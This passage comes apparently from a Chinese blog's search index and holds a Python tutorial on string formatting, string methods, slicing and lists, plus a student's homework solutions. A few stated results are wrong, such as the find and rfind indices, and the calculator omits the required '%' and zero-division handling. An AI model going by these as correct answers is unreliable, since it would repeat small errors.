方法可以将数值按照指定的格式进行格式化输出，其中格式化的方式由参数决定，常见的参数包括 b（二进制）、x（十六进制）、o（八进制）等。\n关于 format 函数format() 方法可以完全代替 % 格式化。实际上，Python 官方已经推荐使用 format() 方法进行字符串格式化，因为它提供了更多的功能和选项，并且更加灵活。format() 方法可以在格式化字符串中指定参数的顺序、精度、对齐方式等，而 % 格式化相对来说功能较为简单。\n另外，从 Python 3.6 版本开始，引入了 f-string，它提供了一种更加简洁、直观的字符串格式化语法，更推荐在新的 Python 项目中使用。但是，即使使用 f-string，format() 方法仍然是一个非常有用的备选方法，特别是对于需要动态生成格式的情况。\n当使用 format() 方法时，可以按照需要定义格式，并在字符串中插入对应的值。下面是一些示例：\n\n基本用法：\nname = &quot;Alice&quot;age = 30print(&quot;My name is &#123;&#125;, and I am &#123;&#125; years old.&quot;.format(name, age))# 输出: My name is Alice, and I am 30 years old.\n\n指定参数顺序：\nprint(&quot;&#123;1&#125; is &#123;0&#125; years old.&quot;.format(age, name))# 输出: Alice is 30 years old.\n\n指定精度：\npi = 3.14159265359print(&quot;The value of pi is &#123;:.2f&#125;&quot;.format(pi))# 输出: The value of pi is 3.14\n\n对齐方式：\nword = &quot;hello&quot;print(&quot;&#x27;&#123;:&gt;10&#125;&#x27;&quot;.format(word))  # 右对齐print(&quot;&#x27;&#123;:&lt;10&#125;&#x27;&quot;.format(word))  # 左对齐print(&quot;&#x27;&#123;:^10&#125;&#x27;&quot;.format(word))  # 居中对齐# 输出: &#x27;     hello&#x27;# 输出: &#x27;hello     &#x27;# 输出: &#x27;  hello   &#x27;\n\n使用命名参数：\nprint(&quot;My name is &#123;name&#125;, and I am &#123;age&#125; years old.&quot;.format(name=&quot;Bob&quot;, age=25))# 输出: My name is Bob, and I am 25 years old.\n\n格式化数字：\nnum = 12345print(&quot;The number is &#123;:,&#125;&quot;.format(num))  # 千位分隔符print(&quot;The number is &#123;:b&#125;&quot;.format(num))  # 二进制# 输出: The number is 12,345# 输出: The number is 11000000111001\n\n进制转换：\n\n\nformat() 函数可以用于进制转换，通过指定格式来将整数以不同进制的形式进行输出。下面是关于进制转换的一些知识点：\n\n基本用法：使用 format() 函数，可以将整数按照指定的进制进行格式化输出。例如：\nnum = 18print(&quot;二进制：&#123;:b&#125;&quot;.format(num))  # 输出：二进制：10010print(&quot;八进制：&#123;:o&#125;&quot;.format(num))  # 输出：八进制：22print(&quot;十六进制：&#123;:x&#125;&quot;.format(num))  # 输出：十六进制：12\n\n保留进制前缀：使用 # 标志可以保留进制前缀，例如 #b 表示二进制、#o 表示八进制、#x 表示十六进制。例如：\nnum = 18print(&quot;二进制（带前缀）：&#123;:#b&#125;&quot;.format(num))  # 输出：二进制（带前缀）：0b10010print(&quot;八进制（带前缀）：&#123;:#o&#125;&quot;.format(num))  # 输出：八进制（带前缀）：0o22print(&quot;十六进制（带前缀）：&#123;:#x&#125;&quot;.format(num))  # 输出：十六进制（带前缀）：0x12\n\n指定位数：可以使用填充符和指定位数来控制输出的位数，例如：\nnum = 18print(&quot;十六进制（固定位数）：&#123;:06x&#125;&quot;.format(num))  # 输出：十六进制（固定位数）：000012\n\n整数转换为不同进制的字符串：如果只是想将整数转换为不同进制的字符串，也可以使用 format() 函数，但是在这种情况下，可以直接使用整数对象的进制转换方法，例如 bin()、oct()、hex()：\nnum = 18binary_str = bin(num)octal_str = oct(num)hexadecimal_str = hex(num)print(&quot;二进制字符串：&quot;, binary_str)  # 输出：二进制字符串： 0b10010print(&quot;八进制字符串：&quot;, octal_str)  # 输出：八进制字符串： 0o22print(&quot;十六进制字符串：&quot;, hexadecimal_str)  # 输出：十六进制字符串： 0x12\n\nstr 类型的内建函数\n大小写转换：\n\nS.lower(): 将字符串 S 中的所有字符转换为小写。\nS.upper(): 将字符串 S 中的所有字符转换为大写。\nS.swapcase(): 将字符串 S 中的大小写互换。\nS.capitalize(): 将字符串 S 中的首字母转换为大写，其他字母转换为小写。\ns.title(): 将字符串 s 中每个单词的首字母转换为大写。\n\ns = &quot;hello world&quot;print(s.lower())  # 输出: hello worldprint(s.upper())  # 输出: HELLO WORLDprint(s.swapcase())  # 输出: HELLO WORLDprint(s.capitalize())  # 输出: Hello worldprint(s.title())  # 输出: Hello World\n\n查找和替换：\n\nS.find(sub, start, end): 返回字符串 S 中子字符串 sub 第一次出现的索引，可指定搜索范围。\nS.rfind(sub, start, end): 返回字符串 S 中子字符串 sub 最后一次出现的索引。\nS.count(sub, start, end): 返回字符串 S 中子字符串 sub 出现的次数。\nS.replace(old, new, count): 将字符串 S 中的 old 子字符串替换为 new，可以指定替换次数。\n\ns = &quot;I love Python. Python is great.&quot;print(s.find(&quot;Python&quot;))  # 输出: 2print(s.rfind(&quot;Python&quot;))  # 输出: 14print(s.count(&quot;Python&quot;))  # 输出: 2print(s.replace(&quot;Python&quot;, &quot;Java&quot;))  # 输出: I love Java. Java is great.\n\n去除空白字符：\n\nS.strip(chars): 移除字符串 S 中指定的字符，默认移除空格。\n\ns = &quot;  hello  &quot;print(s.strip())  # 输出: hello\n\n分割和连接：\n\nS.split(sep, maxsplit): 使用分隔符 sep 将字符串 S 分割成一个列表，maxsplit 指定分割次数。\nS.join(iterable): 将可迭代对象中的字符串连接起来，以字符串 S 作为连接符。\n\ns = &quot;hello-world&quot;print(s.split(&quot;-&quot;))  # 输出: [&#x27;hello&#x27;, &#x27;world&#x27;]a = &#x27;-&#x27;b = [&#x27;hello&#x27;, &#x27;world&#x27;]print(a.join(b))  # 输出: hello-world\n\n打印Print()\nfor i in range(10):    print(i,end=&#x27;&#x27;)#打印在一行    print(i,end=&#x27;\\n&#x27;)#换行符结尾\n\n切片语法\n切片语法：a[起点:终点:步长]。它允许你从列表或字符串中获取一个子集，并且可以指定步长。\n\n从列表中获取索引为 1 到索引为 3（不包括 3）的子集，步长为 1a = [0, 1, 2, 3, 4, 5]print(a[1:3])  # 输出: [1, 2]# 从字符串中获取索引为 1 到索引为 4（不包括 4）的子集，步长为 1s = &quot;abcdef&quot;print(s[1:4])  # 输出: &quot;bcd&quot;\n\n\n切片对象：切片对象可以应用于列表和字符串，但不能应用于整数。例如，a = 5, a[1:3] 是无效的，但可以通过 a = [5] 来创建一个列表，然后进行切片操作。\n\n列表切片a = [0, 1, 2, 3, 4, 5]slice_obj = slice(1, 4)print(a[slice_obj])  # 输出: [1, 2, 3]# 字符串切片s = &quot;abcdef&quot;slice_obj = slice(1, 4)print(s[slice_obj])  # 输出: &quot;bcd&quot;\n\n在这里 slice 是 Python 内置函数，用于创建一个切片对象，该对象可以被应用于可切片对象（比如列表、字符串等）的索引或切片操作中。它接受三个参数：起点、终点和步长，用来指定切片的范围和步长。\n\n起点和终点：切片包含起点，但不包含终点。即，a[1:3] 将会包含索引为 1 和 2 的元素，但不包含索引为 3 的元素。\n\na = [0, 1, 2, 3, 4, 5]# 从索引为 1 到索引为 4（不包括 4）的子集，步长为 1print(a[1:4])  # 输出: [1, 2, 3]# 从索引为 2 到索引为 5（不包括 5）的子集，步长为 1print(a[2:5])  # 输出: [2, 3, 4]\n\n\n步长的默认值：当未指定步长时，默认为 1。如果步长为负数，则从右向左提取元素。\n\na = [0, 1, 2, 3, 4, 5]# 从索引为 0 到索引为 4（不包括 4）的子集，默认步长为 1print(a[:4])  # 输出: [0, 1, 2, 3]# 从索引为 2 到列表末尾的子集，默认步长为 1print(a[2:])  # 输出: [2, 3, 4, 5]\n\n\n负数索引：负数索引表示从右往左的偏移量。例如，a[-1] 表示最后一个元素。\n\na = [0, 1, 2, 3, 4, 5]# 从倒数第二个元素到列表末尾的子集，默认步长为 1print(a[-2:])  # 输出: [4, 5]# 从倒数第四个元素到倒数第二个元素的子集，默认步长为 1print(a[-4:-2])  # 输出: [2, 3]\n\n数字运算这些知识点主要涉及数字运算，包括取余运算、整除运算以及数字的逆序输出。以下是这些知识点的总结：\n\n取余运算（%）：取一个数除以另一个数的余数，这里后面跟着的数字是 10，所以结果都在 0 到 9 之间。\n\n例如：a % 10 取得 a 的个位数。\n\n\n整除运算（&#x2F;&#x2F;）：取一个数除以另一个数的整数部分，相当于向下取整。\n\n例如：a &#x2F;&#x2F; 10 取得 a 的除了个位的其他位组成的数。\n\n\n逆序输出：给定一个整数，以逆序输出各个位上的数字。\n\n例如：对于数字 25165，逆序输出为 5, 6, 1, 5, 2。\n\n\n\n根据上述知识点，代码执行如下：\n\n对于输入的数字 32345：\n\n个位：32345 % 10 &#x3D; 5\n十位：32345 &#x2F;&#x2F; 10 % 10 &#x3D; 4\n百位：32345 &#x2F;&#x2F; 100 % 10 &#x3D; 3\n千位：32345 &#x2F;&#x2F; 1000 % 10 &#x3D; 2\n万位：32345 &#x2F;&#x2F; 10000 &#x3D; 3\n所以，逆序输出为 5, 4, 3, 2, 3\n\n\n对于输入的数字 25165：\n\n个位：25165 % 10 &#x3D; 5\n十位：25165 &#x2F;&#x2F; 10 % 10 &#x3D; 6\n百位：25165 &#x2F;&#x2F; 100 % 10 &#x3D; 1\n千位：25165 &#x2F;&#x2F; 1000 % 10 &#x3D; 5\n万位：25165 &#x2F;&#x2F; 10000 &#x3D; 2\n所以，逆序输出为 5, 6, 1, 5, 2\n\n\n\n下面是逆序的一个例子\n输入数字number = 32345# 计算并逆序输出每一位数字reverse_digits = []while number &gt; 0:    digit = number % 10  # 取个位数字    reverse_digits.append(digit)    number //= 10  # 去除个位数字print(&quot;逆序输出每位数字:&quot;, reverse_digits)# 使用逆序的方式输出每位数字for digit in reversed(reverse_digits):    print(digit, end=&quot; &quot;)\n\n输出结果：\n逆序输出每位数字: [5, 4, 3, 2, 3]5 4 3 2 3 \n\n同样，这个示例也适用于其他数字，只需将 number 变量的值更改为所需的数字即可。\n二维列表操作创建二维列表a = [[1, 2, 3], [3, 4, 5]]\n\n列表拼接lista = [1, 2, 3]listb = [4, 5, 6]result = lista + listb\n\n列表扩展lista = [1, 2, 3]lista.extend([4, 5, 6])\n\n插入元素lista = [1, 2, 3]lista.insert(1, &#x27;x&#x27;)\n\n移除元素lista = [1, 2, 3, 4, 5]lista.remove(3)\n\n查找元素索引lista = [1, 2, 3, 4, 5]index = lista.index(3)\n\n字符串转换为列表string = &quot;hello&quot;lst = list(string)\n\n使用 zip 遍历多个列表a = [1, 2, 3]b = [4, 5, 6]c = [7, 8, 9]for x, y, z in zip(a, b, c):    print(x, y, z)\n\n示例运行结果输出结果1 4 72 5 83 6 9\n\n以上代码提供了对二维列表的创建、拼接、扩展、插入、移除、查找、字符串转换为列表以及使用 zip 遍历多个列表的示例。\n常见题型","categories":["Python","蓝桥"],"tags":["Python","蓝桥"]},{"title":"Python课后题","url":"/posts/9974513c.html","content":"作业 1 Python 语言基础编写程序，输入本金、年利率和年数、计算复利（结果保留两位小数）代码def calculate_compound_interest(principal, rate, years):    # 计算复利    amount = principal * (1 + rate / 100) ** years    # 保留两位小数    return round(amount, 2)# 示例用法principal = float(input(&quot;请输入本金: &quot;))rate = float(input(&quot;请输入年利率: &quot;))years = int(input(&quot;请输入年数: &quot;))compound_interest = calculate_compound_interest(principal, rate, years)print(f&quot;本金利率和为: &#123;compound_interest&#125;&quot;)\n\n输出结果PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt; python -u &quot;d:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1\\2.py&quot;请输入本金: 2000请输入年利率: 5.6请输入年数: 5本金利率和为: 2626.33PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt;\n\n编写程序，输入球的半径，计算球的表面积和体积（结果保留两位小数）代码import mathr = float(input(&quot;请输入球的半径: &quot;))S = 4 * math.pi * r**2V = 4 / 3 * math.pi * r**3print(f&quot;球的表面积为: &#123;S:.2f&#125;, 体积为: &#123;V:.2f&#125;&quot;)\n\n输出结果PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt; python -u &quot;d:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1\\3.py&quot;请输入球的半径: 2.5球的表面积为: 78.54, 体积为: 65.45PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt;\n\n编写程序，声明 getValue(b, r, n)，根据本金 b，年利率 r 和年数 n 计算最终收益 v，v &#x3D; b(1+r) n ，然后编写测试代码，提示输入本金、年利率和年数、显示最终收益（保留两位小数）代码def getValue(b, r, n):    return b * (1 + r) ** n# 测试代码if __name__ == &quot;__main__&quot;:    b = float(input(&quot;请输入本金: &quot;))    r = float(input(&quot;请输入年利率(小数形式): &quot;))    n = int(input(&quot;请输入年数: &quot;))    v = getValue(b, r, n)    print(f&quot;最终收益为: &#123;v:.2f&#125;&quot;)\n\n运行结果PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt; python -u &quot;d:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1\\tempCodeRunnerFile.py&quot;请输入本金: 100请输入年利率(小数形式): 2.5请输入年数: 5最终收益为: 52521.88PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt;\n\n编写程序，求解一元二次方程 x² - 10x + 16 &#x3D; 0代码import matha = 1b = -10c = 16# 判别式delta = b**2 - 4 * a * cif delta &gt; 0:    root1 = (-b + math.sqrt(delta)) / (2 * a)    root2 = (-b - math.sqrt(delta)) / (2 * a)    print(f&quot;方程有两个不同的实数根: &#123;root1&#125; 和 &#123;root2&#125;&quot;)elif delta == 0:    root = -b / (2 * a)    print(f&quot;方程有一个实数根: &#123;root&#125;&quot;)else:    print(&quot;方程无实数根&quot;)\n\n输出结果PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt; python -u &quot;d:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1\\tempCodeRunnerFile.py&quot;方程有两个不同的实数根: 8.0 和 2.0PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt;\n\n编写程序，提示输入姓名和出生年份，输出姓名和年龄代码# 编写程序，提示输入姓名和出生年份，输出姓名和年龄name = input(&quot;请输入姓名: &quot;)year = int(input(&quot;请输入出生年份: &quot;))age = 2024 - yearprint(f&quot;您好！&#123;name&#125;。今年&#123;age&#125;岁&quot;)\n\n输出结果PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt; python -u &quot;d:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1\\6.py&quot;请输入姓名: W1ndys请输入出生年份: 2004您好！W1ndys。今年20岁PS D:\\Documents\\StudyData\\QFNU\\AAA课程\\Python\\课程\\作业1&gt;\n\n作业 2 程序流程控制编写程序，格式化输出杨辉三角。杨辉三角即二项式定理的系数表，各元素满足如下条件：第一列及对角线上的元素均为 1；其余每个元素等于它上一行同一列元素与前一列元素之和。杨辉三角i = int(input(&quot;输入行数: &quot;))number_list = []for j in range(1, i + 1):    number_list.insert(0, 1)    for k in range(1, len(number_list) - 1):        number_list[k] = number_list[k] + number_list[k + 1]    line = &quot;&quot;    for _ in number_list:        line += str(_) + &quot; &quot;    print(line.center(i * 2))\n\n输入直角三角形的两个直角边，求三角形的周长和面积，以及两个锐角的度数。结果均保留一位小数。其运行效果如图 44 所示。import mathi, j = int(input(&quot;请输入三角形的直角边A(&gt;0): &quot;)), int(    input(&quot;请输入三角形的直角边B(&gt;0): &quot;))print(f&quot;直角三角形的三边分别为: a=&#123;i:.1f&#125;, b=&#123;j:.1f&#125;, c=&#123;math.sqrt(i**2 + j**2):.1f&#125;&quot;)print(f&quot;三角形的周长 = &#123;i + j + math.sqrt(i**2 + j**2):.1f&#125;，面积 = &#123;i * j / 2:.1f&#125;&quot;)print(    f&quot;三角形两个锐角的度数分别为: &#123;round(math.asin(i / math.sqrt(i**2 + j**2)) * 180 / math.pi, 0):.1f&#125; 和 &#123;round(math.asin(j / math.sqrt(i**2 + j**2)) * 180 / math.pi, 0):.1f&#125;&quot;)\n\n编程产生 0~100（包含 0 和 100）的 3 个随机数 a、b 和 c, 要求至少使用两种不同的方法，将 3 个数按从小到大的顺序排序。其运行效果如图 4-5 所示（其中，a、b 和 c 的值随机生成）。import random# 直接排序def direct_sort():    a = random.randint(1, 100)    b = random.randint(1, 100)    c = random.randint(1, 100)    print(f&quot;直接排序前: a=&#123;a&#125;, b=&#123;b&#125;, c=&#123;c&#125;&quot;)    if a &gt; b:        a, b = b, a    if a &gt; c:        a, c = c, a    if b &gt; c:        b, c = c, b    print(f&quot;直接排序后: a=&#123;a&#125;, b=&#123;b&#125;, c=&#123;c&#125;&quot;)# sort()排序def sort_sort():    a = random.randint(1, 100)    b = random.randint(1, 100)    c = random.randint(1, 100)    print(f&quot;sort()排序前: a=&#123;a&#125;, b=&#123;b&#125;, c=&#123;c&#125;&quot;)    a, b, c = sorted([a, b, c])    print(f&quot;sort()排序后: a=&#123;a&#125;, b=&#123;b&#125;, c=&#123;c&#125;&quot;)if __name__ == &quot;__main__&quot;:    direct_sort()    sort_sort()\n\n编程计算有固定工资收入的党员每月所交纳的党费。工资基数 3000 元及以下者，交纳工资基数的 0.5%；工资基数 30005000 元者，交纳工资基数的 1%；工资基数在 5000 10000 元者，交纳工资基数的 1.5%；工资基数超过 10000 元者，交纳工资基数的 2%。运行效果如图 4-6 示。i = int(input(&quot;请输入有固定工资收入的党员的月工资：&quot;))if i &lt;= 3000:    f = 0.5 * 0.01 * ielif i &lt;= 5000:    f = 1 * 0.01 * ielif i &lt;= 10000:    f = 1.5 * 0.01 * ielse:    f = 2 * 0.01 * iprint(f&quot;月工资 = &#123;i&#125;, 交纳党费 = &#123;f&#125;&quot;)\n\n编程实现袖珍计算器，要求输入两个操作数和一个操作符（十、一、、&#x2F;、%），根据操作符输出运算结果。注意“&#x2F;”和“%”运算符的零除异常问题。其运行效果如图 4-7 所示。x = float(input(&quot;请输入操作数x：&quot;))y = float(input(&quot;请输入操作数y：&quot;))n = input(&quot;请输入操作符：&quot;)if n == &quot;+&quot;:    print(f&quot;&#123;x:.1f&#125; + &#123;y:.1f&#125; = &#123;x + y:.1f&#125;&quot;)elif n == &quot;-&quot;:    print(f&quot;&#123;x:.1f&#125; - &#123;y:.1f&#125; = &#123;x - y:.1f&#125;&quot;)elif n == &quot;*&quot;:    print(f&quot;&#123;x:.1f&#125; * &#123;y:.1f&#125; = &#123;x * y:.1f&#125;&quot;)elif n == &quot;/&quot;:    print(f&quot;&#123;x:.1f&#125; / &#123;y:.1f&#125; = &#123;x / y:.1f&#125;&quot;)else:    print(&quot;输入错误&quot;)\n\n输入三角形的 3 条边 a、b、c, 判断此 3 边是否可以构成三角形。若能，进一步判断三角形的性质，即为等边、等腰、直角或其他三角形。本题的判断准则参见表 4-16。其运行效果如图 4-8 所示。a = float(input(&quot;请输入三角形的边a：&quot;))b = float(input(&quot;请输入三角形的边b：&quot;))c = float(input(&quot;请输入三角形的边c：&quot;))if a + b &gt; c and a + c &gt; b and b + c &gt; a:    if a == b == c:        print(&quot;该三角形为等边三角形！&quot;)    elif a == b or a == c or b == c:        print(&quot;该三角形为等腰三角形！&quot;)    elif a**2 + b**2 == c**2 or a**2 + c**2 == b**2 or b**2 + c**2 == a**2:        print(&quot;该三角形为直角三角形！&quot;)    else:        print(&quot;该三角形为一般三角形！&quot;)else:    print(&quot;无法构成三角形！&quot;)\n\n编程实现鸡兔同笼问题。已知在同一个笼子里共有 h 只鸡和兔，鸡和兔的总脚数为 f, 其中 h 和 f 由用户输入，求鸡和兔各有多少只？要求使用两种方法：一是求解方程；二是利用循环进行枚举测试。h = int(input(&quot;请输入总头数：&quot;))f = int(input(&quot;请输入总脚数（必须是偶数）：&quot;))while f % 2 != 0:    f = int(input(&quot;请输入总脚数（必须是偶数）：&quot;))r = f / 2 - hc = h - rif c &gt;= 0 and r &gt;= 0 and c == int(c) and r == int(r):    print(f&quot;方法一：鸡：&#123;int(c)&#125;只，兔：&#123;int(r)&#125;只&quot;)else:    print(&quot;方法一：无解，请重新运行测试！&quot;)for c in range(0, h + 1):    r = h - c    if 2 * c + 4 * r == f:        print(f&quot;方法二：鸡：&#123;int(c)&#125;只，兔：&#123;int(r)&#125;只&quot;)        breakelse:    print(&quot;方法二：无解，请重新运行测试！&quot;)\n\n输入任意实数 x, 计算 e 的近似值，直到最后一项的绝对值小于 10  6  为止偷个懒，直接用 math 库嘿嘿\nimport mathx = float(input(&quot;请输入x：&quot;))print(pow(math.e, x))\n\n输入任意实数 a(a≥0)，用迭代法求 x &#x3D; √a, 要求计算的相对偏差小于 10 -6 。def sqrt_iterative(a, tolerance=1e-6):    x = a    while True:        next_x = 0.5 * (x + a / x)        if abs(next_x - x) &lt; tolerance:            return next_x        x = next_xa = float(input(&quot;请输入a：&quot;))if a &gt;= 0:    print(f&quot;&#123;a:.0f&#125;的算数平方根为=&#123;sqrt_iterative(a)&#125;&quot;)else:    print(&quot;输入的数必须大于等于0&quot;)\n\n我国汉代有位大将，名叫韩信。他每次集合部队，只要求部下先后按 13、15、17 报数，然后再报告一下各队每次报数的余数，他就知道到了多少人。他的这种巧妙算法被人们称为“鬼谷算”，也叫“隔墙算”，或称为“韩信点兵”，外国人还称它为“中国余数定理”。即有一个数，用 3 除余 2，用 5 除余 3，用 7 除余 2，请问 01000 中这样的数有哪些？print(&quot;0~1000中用3除余2，用5除余3，用7除余2的数有：&quot;)for i in range(0, 1001):    if i % 3 == 2 and i % 5 == 3 and i % 7 == 2:        print(i, end=&quot; &quot;)\n\n一球从 100 米的高度自由落下，每次落地后反弹回原高度的一半，再落下。·求小球在第 10 次落地时共经过多少米？第 10 次反弹多高？# 初始高度height = 100# 总距离total_distance = 100# 计算第10次落地时的总距离和反弹高度for i in range(1, 10):    height /= 2    total_distance += height * 2print(f&quot;小球在第10次落地时，共经过&#123;total_distance&#125;米&quot;)print(f&quot;第10次反弹&#123;height&#125;米&quot;)\n\n猴子吃桃问题。猴子第一天摘下若干个桃子，当天吃掉一半多一个；第二天接着吃了剩下的桃子的一半多一个；以后每天都吃了前一天剩下的桃子的一半多一个。到第 8 天发现只剩一个桃子了。请问猴子第一天共摘了多少个桃子？# 猴子吃桃def monkey_eat_peach(n):    if n == 1:        return 1    else:        return (monkey_eat_peach(n - 1) + 1) * 2for i in range(8):    print(f&quot;第&#123;i+1&#125;天的桃子数为：&#123;monkey_eat_peach(i+1)&#125;&quot;)\n\n计算 $S_n &#x3D; 1+11+111+1111+\\ldots+1111$（最后一项是 $n$ 个 $1$）。提示：第 $1$ 项 $T_1 &#x3D; 1$；第 $2$ 项 $T_2 &#x3D; T_1 \\times 10 + 1$；…；第 $n$ 项 $T_n &#x3D; T_{n-1} \\times 10 + 1$。$n$ 是一个随机产生的 $1$~$10$（包括 $1$ 和 $10$）中的正整数。import randomn = random.randint(1, 10)def an(n):    if n == 1:        return 1    else:        return an(n - 1) * 10 + 1sn = 0for i in range(1, n + 1):    sn += an(i)print(f&quot;当n=&#123;n&#125;时，sum_sn=&#123;sn&#125;&quot;)\n\n作业 3 常用内置数据类型编写程序，计算 1+2+3 十十 100 之和。sum = 0for i in range(1, 101):    sum += iprint(sum)\n\n编写程序，计算 10 十 9 十 8 十十 1 之和。sum = 0for i in range(10, 0, -1):    sum += iprint(sum)\n\n编写程序，计算 1 十 3 十 5 十 7 十 99 之和。sum = 0for i in range(1, 101):    if i % 2 != 0:        sum += iprint(sum)\n\n编写程序，计算 2 十 4 十 6 十 8…十 100 之和。sum = 0for i in range(1, 101):    if i % 2 == 0:        sum += iprint(sum)\n\n编写程序，使用不同的实现方法输出 2000 一 3000 的所有闰年for i in range(2000, 3001):    if i % 4 == 0 and i % 100 != 0 or i % 400 == 0:        print(i, end=&quot; &quot;)\n\n编写程序，计算 S.&#x3D; 13+十 5 一 7 十 9 一 11 十…n = int(input())while n % 2 == 0:    print(&quot;请输入奇数&quot;)    n = int(input())Sn = 0sign = 1for i in range(1, n + 1, 2):    Sn += sign * i    sign *= -1print(&quot;Sn =&quot;, Sn)\n\n编写程序，计算 S.&#x3D; 1 十 1&#x2F;2 十 1&#x2F;3 十…# 求n分之一def fraction_to_decimal(n):    return 1 / nn = int(input(&quot;请输入一个整数：&quot;))sum = 0for i in range(1, n + 1):    sum += fraction_to_decimal(i)print(sum)\n\n编写程序，打印九九乘法表。要求输出九九乘法表的各种显示效果（上三角、下三角、矩形块等方式)。# 打印九九乘法表的矩形块def print_multiplication_table():    for i in range(1, 10):        for j in range(1, 10):            print(f&quot;&#123;i&#125;*&#123;j&#125;=&#123;i*j&#125;&quot;, end=&quot;\\t&quot;)        print()# 打印九九乘法表的上三角def print_upper_triangle():    for i in range(1, 10):        for j in range(i, 10):            print(f&quot;&#123;i&#125;*&#123;j&#125;=&#123;i*j&#125;&quot;, end=&quot;\\t&quot;)        print()# 打印九九乘法表的下三角def print_lower_triangle():    for i in range(1, 10):        for j in range(1, i + 1):            print(f&quot;&#123;i&#125;*&#123;j&#125;=&#123;i*j&#125;&quot;, end=&quot;\\t&quot;)        print()print(&quot;矩形块:&quot;)print_multiplication_table()print(&quot;\\n上三角:&quot;)print_upper_triangle()print(&quot;\\n下三角:&quot;)print_lower_triangle()\n\n编写程序，输入三角形的 3 条边，先判断是否可以构成三角形，如果可以，则进一步求三角形的周长和面积，否则报错“无法构成三角形！”。其运行效果如图 3-11 所示（结果均保留一位小数)。a, b, c = (    int(input(&quot;请输入三角形的三边长：&quot;)),    int(input(&quot;请输入三角形的三边长：&quot;)),    int(input(&quot;请输入三角形的三边长：&quot;)),)if a + b &gt; c and a + c &gt; b and b + c &gt; a and a &gt; 0 and b &gt; 0 and c &gt; 0:    S = (a + b + c) / 2    area = (S * (S - a) * (S - b) * (S - c)) ** 0.5    print(f&quot;三角形的面积为：&#123;area&#125;&quot;)else:    print(&quot;输入的三边长不能构成一个三角形&quot;)\n\n作业 4 序列数据类型统计单词个数str = input(&quot;请输入字符串：&quot;)space_count = 0number_count = 0other_count = 0for i in str:    if i == &quot; &quot;:        space_count += 1print(f&quot;其中单词数为：&#123;space_count+1&#125;&quot;)\n\n删除 list 重复元素list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3, 4, 5]new_list = []for i in list:    if i not in new_list:        new_list.append(i)print(new_list)\n\n求列表中元素个数，最大值，最小值，元素之和，平均值s = [9, 7, 8, 3, 2, 1, 55, 6]count = 0max = s[0]min = s[0]sum = 0avg = 0for i in s:    if i &gt; max:        max = i    if i &lt; min:        min = i    sum += iavg = sum / len(s)print(f&quot;最大值：&#123;max&#125;，最小值：&#123;min&#125;，和：&#123;sum&#125;，平均值：&#123;avg&#125;&quot;)\n\n列表内偶数变次方，奇数不变s = [9, 7, 8, 3, 2, 1, 5, 6]new_s = []for i in s:    if i % 2 == 0:        new_s.append(i**2)    else:        new_s.append(i)print(f&quot;变换前：&#123;s&#125;&quot;)print(f&quot;变换后：&#123;new_s&#125;&quot;)\n\n将字符串中的每个字符的 ASCII 码存入列表str = input(&quot;请输入字符串：&quot;)list = []for i in str:    list.append(ord(i))print(list)\n\n作业 4 附加题列表元素用特定符号连接list = [&quot;字符1&quot;, &quot;字符2&quot;, &quot;字符3&quot;, &quot;字符4&quot;, &quot;字符5&quot;, &quot;字符6&quot;]print(&quot;-&quot;.join(list))\n\n删除列表重复元素，去重元素放到新列表list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3, 4, 5]new_list = []for i in list:    if i not in new_list:        new_list.append(i)print(new_list)\n\n输入多个分数存在列表，去除最高分和最低分，求平均分lst = list(map(int, input(&quot;请输入数字，用空格隔开：&quot;).split(&quot; &quot;)))lst.sort()lst = lst[1:-1]avg = sum(lst) / len(lst)print(avg)\n\n空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除# 空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除# lst = [80, 50, 23, 61, 83, 35, 37, 51, 1, 37]# 空列表的添加lst = []for i in range(10):    lst.append(int(input(&quot;请输入第&#123;&#125;个成绩：&quot;.format(i + 1))))print(f&quot;10个成绩为&#123;lst&#125;&quot;)# 最高最低平均print(f&quot;最高分为&#123;max(lst)&#125;&quot;)print(f&quot;最低分为&#123;min(lst)&#125;&quot;)print(f&quot;平均分为&#123;sum(lst) / len(lst)&#125;&quot;)# 降序排列lst.sort(reverse=True)print(f&quot;降序排列后10个成绩为&#123;lst&#125;&quot;)# 前三名print(f&quot;前三名成绩为&#123;lst[:3]&#125;&quot;)# 后三名print(f&quot;后三名成绩为&#123;lst[-3:]&#125;&quot;)# 首尾插入lst.insert(0, 100)lst.append(0)print(f&quot;插入后成绩为&#123;lst&#125;&quot;)# 后五替换lst[-5:] = [60] * 5print(f&quot;替换后成绩为&#123;lst&#125;&quot;)# 奇数删除lst = [i for i in lst if i % 2 == 0]print(f&quot;删除后成绩为&#123;lst&#125;&quot;)\n\n横版竖版输出古诗# 5.pydef print_poem(poem):    # 将诗句按行分割    lines = poem.split(&quot;\\n&quot;)    # 打印横版    print(&quot;--------横版--------&quot;)    for line in lines:        print(line)    # 打印竖版    print(&quot;\\n--------竖版--------&quot;)    max_length = max(len(line) for line in lines)    for i in range(max_length):        for line in reversed(lines):  # 顺序倒置            if i &lt; len(line):                print(line[i], end=&quot; &quot;)            else:                print(&quot;  &quot;, end=&quot; &quot;)        print()# 输入古诗poem = &quot;&quot;&quot;白日依山尽黄河入海流欲穷千里目更上一层楼&quot;&quot;&quot;print_poem(poem)\n\n实验 5 输入和输出解析命令行参数# https://www.cnblogs.com/techflow/p/13631509.html#/import argparsedef calculate_square_properties(side_length):    perimeter = 4 * side_length    area = side_length * side_length    return 